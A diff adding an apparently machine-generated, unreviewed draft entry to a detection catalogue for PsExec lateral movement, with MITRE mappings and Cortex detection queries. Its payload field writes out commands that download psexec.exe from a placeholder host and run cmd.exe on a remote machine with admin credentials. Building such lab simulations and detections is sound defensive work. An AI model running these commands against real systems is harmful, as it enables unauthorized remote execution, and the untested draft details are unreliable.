@@ -1,0 +1,164 @@
+{
+  "id": "TTP-0000-0018",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "source-not-recorded"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "PsExec Lateral Movement via Remote Service Creation",
+    "summary": "An attacker uses PsExec to create a remote service and execute a command on a target host. Cortex should detect the process execution and network connection associated with this behavior.",
+    "description": "An attacker uses PsExec to create a remote service and execute a command on a target host. Cortex should detect the process execution and network connection associated with this behavior."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1021",
+        "subtechnique_id": "T1021.002",
+        "name": "Remote Services: SMB/Windows Admin Shares",
+        "tactic_ids": [
+          "TA0008"
+        ],
+        "tactic_names": [
+          "Lateral Movement"
+        ]
+      },
+      {
+        "technique_id": "T1569",
+        "subtechnique_id": "T1569.002",
+        "name": "System Services: Service Execution",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "powershell -Command \"Invoke-WebRequest -Uri 'http://192.0.2.5/psexec.exe' -OutFile 'C:\\\\temp\\\\psexec.exe'\"\nC:\\temp\\psexec.exe \\\\TARGETHOST -u ADMINUSER -p PASSWORD -c -f cmd.exe /c \"echo Hello > C:\\\\temp\\\\output.txt\"\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "PsExec process execution on the source host",
+        "expected_value": "actor_process_image_name = 'psexec.exe'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound connection to target host",
+        "expected_value": "action_remote_ip = '192.0.2.10'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "PsExec Remote Process Execution",
+        "description": "Detection of PsExec process starting with remote service execution",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'psexec.exe'\n| filter action_process_image_name = 'cmd.exe'\n| filter action_remote_ip != null",
+        "mitre_technique_ids": [
+          "T1021.002"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Attempt to execute a command on a remote host using PsExec",
+        "description": "Detection of PsExec creating a remote service and executing a command",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'psexec.exe'\n| filter action_remote_ip = '192.0.2.10'\n| filter action_process_image_name = 'cmd.exe'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "PsExec process start with remote IP",
+        "mitre_technique_ids": [
+          "T1021.002"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "PsExec Remote Execution Detection",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'psexec.exe'\n| filter action_remote_ip != null\n| filter action_process_image_name = 'cmd.exe'\n| fields agent_hostname, actor_process_image_name, action_remote_ip, action_process_image_name",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Attempt to execute a command on a remote host using PsExec; Required Data: XDR Agent; ATT&CK T1021.002,T1569.002. Ref: cortex-docs.paloaltonetworks.com/analytics-alerts."
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "MITRE ATT&CK T1021.002",
+      "url": "https://attack.mitre.org/techniques/T1021/002/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1569.002",
+      "url": "https://attack.mitre.org/techniques/T1569/002/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
